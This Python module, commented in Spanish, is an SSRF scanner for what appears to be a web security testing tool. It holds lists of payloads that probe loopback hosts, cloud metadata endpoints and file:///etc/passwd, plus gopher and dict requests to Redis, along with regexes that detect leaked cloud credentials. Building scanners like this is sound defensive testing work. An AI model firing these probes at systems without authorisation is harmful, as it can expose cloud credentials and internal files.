"""SSRF-BAIT: bateria dedicada de Server-Side Request Forgery.

Detecta si un parametro que recibe una URL es usado por el backend para
hacer una peticion saliente. 100% MODO LECTURA (canarios inertes):

  1. INTERNAL-PROBE  sondas a 127.0.0.1 / localhost / 0.0.0.0 para ver si
                     el backend se responde a si mismo (diferencial de
                     status/longitud vs baseline).
  2. CLOUD-META      169.254.169.254 (AWS/Azure/GCP metadata) — si la
                     respuesta contiene tokens/AMI-ID, es critico.
  3. PROTOCOL        file:// / gopher:// / dict:// / ftp:// — si el
                     backend acepta schemes no-HTTP, hay RCE en potencia.

Todo con presupuesto de sondas por parametro y anti-FP por comparacion
contra baseline.
"""

import difflib
import re
import time
from typing import Any, Dict, List, Optional, Tuple
from urllib.parse import urlparse, parse_qsl, urlencode, urlunparse

# nombres de parametros que tipicamente reciben URLs
URL_NAMES = re.compile(
    r"(url|uri|redirect|callback|webhook|fetch|source|target|dest|"
    r"destination|proxy|ref|return|next|continue|link|file|image|"
    r"avatar|media|remote|load|import|open|get|resource|site|host|"
    r"server|endpoint|api|feed|rss|xml|svg|crawl|archive|preview)", re.I)

# sondas internas (localhost / loopback)
INTERNAL_PROBES = [
    "http://127.0.0.1/",
    "http://127.0.0.1:80/",
    "http://localhost/",
    "http://0.0.0.0/",
    "http://[::1]/",
    "http://127.0.0.1:22/",
    "http://127.0.0.1:8080/",
    "http://127.0.0.1:443/",
]

# cloud metadata endpoints
CLOUD_PROBES = [
    "http://169.254.169.254/latest/meta-data/",          # AWS
    "http://169.254.169.254/metadata/instance?api-version=2021-02-01",  # Azure
    "http://metadata.google.internal/computeMetadata/v1/",  # GCP
]

# signatures de metadata cloud en la respuesta
CLOUD_SIGNS = [
    (r"ami-id|instance-id|instanceId|i-[a-z0-9]{8,}", "AWS metadata"),
    (r"vmId|subscriptionId|azEnvironment", "Azure metadata"),
    (r"projects/[0-9]+/zones/|gce-metadata", "GCP metadata"),
    (r"accessKeyId|secretAccessKey|token", "credenciales cloud"),
]

# protocolos no-HTTP (si el backend los acepta = RCE en potencia)
PROTOCOL_PROBES = [
    ("file:///etc/passwd", r"root:[x*!]:0:0:", "file:// (lectura de archivo local)"),
    ("file:///etc/hostname", r"[a-z0-9\-]+\n", "file:// (hostname)"),
    ("gopher://127.0.0.1:6379/_INFO", r"redis_version", "gopher:// (Redis)"),
    ("dict://127.0.0.1:6379/INFO", r"redis_version", "dict:// (Redis)"),
    ("ftp://127.0.0.1/", r"220|ftp|anonymous", "ftp:// (FTP interno)"),
]

SIM_THRESHOLD = 0.92   # si la respuesta cambia >8% vs baseline, reacciono


def _set_qs(url: str, extra: Dict[str, str]) -> str:
    p = urlparse(url)
    qs = dict(parse_qsl(p.query))
    qs.update(extra)
    return urlunparse(p._replace(query=urlencode(qs)))


def _sim(a: str, b: str) -> float:
    if not a and not b:
        return 1.0
    if not a or not b:
        return 0.0
    return difflib.SequenceMatcher(None, a[:8000], b[:8000]).quick_ratio()


class SsrfBait:
    def __init__(self, session, emit, delay: float = 0.0):
        self.session = session
        self.emit = emit or (lambda m: None)
        self.delay = delay

    def _get(self, url: str):
        try:
            return self.session.get(url, timeout=15, allow_redirects=False)
        except Exception:
            return None

    def _baseline(self, url: str) -> Optional[Tuple[int, str]]:
        r = self._get(url)
        if r is None:
            return None
        return (r.status_code, (r.text or "")[:8000])

    def _finding(self, kind: str, url: str, param: str, reason: str,
                 evidence: str, severity: str = "alta") -> Dict[str, Any]:
        return {
            "type": f"SSRF ({kind})", "target": url, "param": param,
            "severity": severity, "leak": False, "ssrf": True,
            "reason": reason, "evidence": evidence,
        }

    # ----------------------------------------------------- internal probe

    def _test_internal(self, url: str, param: str, base: Tuple[int, str]) -> Optional[Dict[str, Any]]:
        for probe in INTERNAL_PROBES:
            r = self._get(_set_qs(url, {param: probe}))
            if r is None:
                continue
            body = (r.text or "")[:8000]
            sim = _sim(body, base[1])
            # reaccion: status distinto o body muy distinto al baseline
            reacted = (r.status_code != base[0] and r.status_code != 404) or sim < SIM_THRESHOLD
            if reacted:
                return self._finding(
                    "internal-probe", _set_qs(url, {param: probe}), param,
                    f"el parametro {param} recibe una URL interna "
                    f"({probe}) y el backend hace la peticion: status "
                    f"{base[0]}->{r.status_code}, similitud {sim:.3f}",
                    f"baseline status={base[0]} len={len(base[1])} · "
                    f"probe status={r.status_code} len={len(body)} sim={sim:.3f}")
            time.sleep(self.delay)
        return None

    # ----------------------------------------------------- cloud metadata

    def _test_cloud(self, url: str, param: str) -> Optional[Dict[str, Any]]:
        for probe in CLOUD_PROBES:
            r = self._get(_set_qs(url, {param: probe}))
            if r is None:
                continue
            body = (r.text or "")[:8000]
            for sig, what in CLOUD_SIGNS:
                if re.search(sig, body, re.I):
                    return self._finding(
                        "cloud-metadata", _set_qs(url, {param: probe}), param,
                        f"el backend consulta el metadata de {what} y "
                        f"devuelve datos sensibles en la respuesta",
                        f"respuesta contiene patron de {what}: "
                        + body[:200].replace("\n", " ").strip(),
                        severity="critica")
            time.sleep(self.delay)
        return None

    # ----------------------------------------------------- protocol probe

    def _test_protocol(self, url: str, param: str) -> Optional[Dict[str, Any]]:
        for probe, sig, what in PROTOCOL_PROBES:
            r = self._get(_set_qs(url, {param: probe}))
            if r is None:
                continue
            body = (r.text or "")[:8000]
            if re.search(sig, body, re.I):
                return self._finding(
                    "protocol-smuggling", _set_qs(url, {param: probe}), param,
                    f"el backend acepta el scheme {probe.split(':')[0]}:// "
                    f"y accede a recursos internos ({what})",
                    f"respuesta contiene firma de {what}: "
                    + body[:200].replace("\n", " ").strip(),
                    severity="critica")
            time.sleep(self.delay)
        return None

    # ---------------------------------------------------------------- run

    def run(self, url: str, spider_out: Dict[str, Any]) -> List[Dict[str, Any]]:
        self.emit("[ssrf] === SSRF-BAIT: sondas internas + cloud + protocolos ===")
        findings: List[Dict[str, Any]] = []
        targets = spider_out.get("param_targets", [])

        # params con nombre de URL primero; luego params de alto valor
        named = [t for t in targets if URL_NAMES.search(t.get("param", ""))]
        high = [t for t in targets
                if t.get("score", 0) >= 8 and t not in named][:3]

        all_targets = named[:8] + high
        if all_targets:
            self.emit(f"[ssrf] {len(all_targets)} parametro(s) candidato(s) "
                      f"({len(named)} con nombre de URL + {len(high)} alto valor)")

        for t in all_targets:
            base = self._baseline(t["url"])
            if base is None:
                continue

            # 1) internal probe (diferencial vs baseline)
            f = self._test_internal(t["url"], t["param"], base)
            if f:
                findings.append(f)
                self.emit(f"[ssrf] 💥 SSRF interno: {t['param']} en "
                          f"{urlparse(t['url']).path} hace peticion al backend")
                continue  # confirmado, no seguir martillando

            # 2) cloud metadata (firma directa)
            f = self._test_cloud(t["url"], t["param"])
            if f:
                findings.append(f)
                self.emit(f"[ssrf] 💥💥 SSRF cloud-metadata: {t['param']} "
                          f"filtra credenciales de cloud")
                continue

            # 3) protocol smuggling (file://, gopher://, dict://, ftp://)
            f = self._test_protocol(t["url"], t["param"])
            if f:
                findings.append(f)
                self.emit(f"[ssrf] 💥💥 SSRF protocol smuggling: {t['param']} "
                          f"acepta scheme no-HTTP")

        n = len(findings)
        self.emit(f"[ssrf] === SSRF-BAIT: {n} hallazgo(s) ===")
        return findings
